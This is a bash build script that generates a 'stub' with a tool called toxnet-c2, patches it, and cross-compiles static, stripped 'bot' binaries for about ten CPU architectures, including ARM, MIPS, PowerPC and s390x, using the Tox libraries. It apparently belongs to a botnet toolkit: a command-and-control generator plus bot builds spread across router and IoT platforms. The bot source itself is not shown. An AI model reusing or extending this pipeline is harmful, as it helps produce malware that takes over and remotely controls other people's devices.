#!/bin/bash
# save as build.sh

GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

mkdir -p bots
LIBS="cross_libs"

# --- 1. GENERATE & PATCH STUB ---
echo "[+] Generating fresh stub from toxnet-c2..."
if [ -f "./toxnet-c2" ]; then
    ./toxnet-c2 -t linux -o /dev/null
    # Fix the missing headers in the newly generated file
    sed -i '1s/^/#include <sys\/prctl.h>\n#include <sys\/random.h>\n/' temp_linux_stub.c
else
    echo "[!] toxnet-c2 not found. Using existing stub."
fi

echo "Starting builds..."

# 2. Native & i386
echo -n "Linux x86_64... "
gcc -static -s -O2 -o bots/bot_linux_x86_64 temp_linux_stub.c -ltoxcore -lsodium -lpthread -lm -ldl 2>/dev/null && echo -e "${GREEN}✓${NC}" || echo -e "${RED}✗${NC}"

echo -n "i386... "
i686-linux-gnu-gcc -static -s -O2 -o bots/bot_i386 temp_linux_stub.c -I$LIBS/i386/usr/include -L$LIBS/i386/usr/lib/i386-linux-gnu -ltoxcore -lsodium -lpthread -lm -ldl 2>/dev/null && echo -e "${GREEN}✓${NC}" || echo -e "${RED}✗${NC}"

# 3. ARM
echo -n "ARMv7 (armhf)... "
arm-linux-gnueabihf-gcc -static -s -O2 -o bots/bot_armv7 temp_linux_stub.c -I$LIBS/armhf/usr/include -L$LIBS/armhf/usr/lib/arm-linux-gnueabihf -ltoxcore -lsodium -lpthread -lm -ldl 2>/dev/null && echo -e "${GREEN}✓${NC}" || echo -e "${RED}✗${NC}"

echo -n "ARMv5 (armel)... "
arm-linux-gnueabi-gcc -static -s -O2 -o bots/bot_armv5 temp_linux_stub.c -I$LIBS/armel/usr/include -L$LIBS/armel/usr/lib/arm-linux-gnueabi -ltoxcore -lsodium -lpthread -lm -ldl 2>/dev/null && echo -e "${GREEN}✓${NC}" || echo -e "${RED}✗${NC}"

echo -n "ARM64... "
aarch64-linux-gnu-gcc -static -s -O2 -o bots/bot_arm64 temp_linux_stub.c -I$LIBS/arm64/usr/include -L$LIBS/arm64/usr/lib/aarch64-linux-gnu -ltoxcore -lsodium -lpthread -lm -ldl 2>/dev/null && echo -e "${GREEN}✓${NC}" || echo -e "${RED}✗${NC}"

# 4. MIPS
echo -n "MIPSEL (le)... "
mipsel-linux-gnu-gcc -static -s -O2 -o bots/bot_mipsel temp_linux_stub.c -I$LIBS/mipsel/usr/include -L$LIBS/mipsel/usr/lib/mipsel-linux-gnu -ltoxcore -lsodium -lpthread -lm -ldl 2>/dev/null && echo -e "${GREEN}✓${NC}" || echo -e "${RED}✗${NC}"

echo -n "MIPS (be)... "
mips-linux-gnu-gcc -static -s -O2 -o bots/bot_mips temp_linux_stub.c -I$LIBS/mips/usr/include -L$LIBS/mips/usr/lib -ltoxcore -lsodium -lpthread -lm -ldl 2>/dev/null && echo -e "${GREEN}✓${NC}" || echo -e "${RED}✗${NC}"

echo -n "MIPS64EL... "
mips64el-linux-gnuabi64-gcc -static -s -O2 -o bots/bot_mips64el temp_linux_stub.c -I$LIBS/mips64el/usr/include -L$LIBS/mips64el/usr/lib/mips64el-linux-gnuabi64 -ltoxcore -lsodium -lpthread -lm -ldl 2>/dev/null && echo -e "${GREEN}✓${NC}" || echo -e "${RED}✗${NC}"

# 5. Others
echo -n "PPC64EL... "
powerpc64le-linux-gnu-gcc -static -s -O2 -o bots/bot_ppc64el temp_linux_stub.c -I$LIBS/ppc64el/usr/include -L$LIBS/ppc64el/usr/lib/powerpc64le-linux-gnu -ltoxcore -lsodium -lpthread -lm -ldl 2>/dev/null && echo -e "${GREEN}✓${NC}" || echo -e "${RED}✗${NC}"

echo -n "S390X... "
s390x-linux-gnu-gcc -static -s -O2 -o bots/bot_s390x temp_linux_stub.c -I$LIBS/s390x/usr/include -L$LIBS/s390x/usr/lib/s390x-linux-gnu -ltoxcore -lsodium -lpthread -lm -ldl 2>/dev/null && echo -e "${GREEN}✓${NC}" || echo -e "${RED}✗${NC}"

echo "Build complete."
